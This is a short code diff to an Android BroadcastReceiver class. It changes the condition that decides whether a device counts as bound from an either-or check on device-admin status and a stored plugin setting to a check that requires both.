@@ -68,7 +68,7 @@ public class ScreenBRC extends BroadcastReceiver {
 
         DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
         boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class))
-                                     || PluginSettingManager.getInstance().getKeyHasBindingDevices();
+                                     && PluginSettingManager.getInstance().getKeyHasBindingDevices();
 
         String oldPhoneNumbers = PluginSettingManager.getInstance().getBroadcastPhoneNumber();
         if (!TextUtils.isEmpty(oldPhoneNumbers)) {
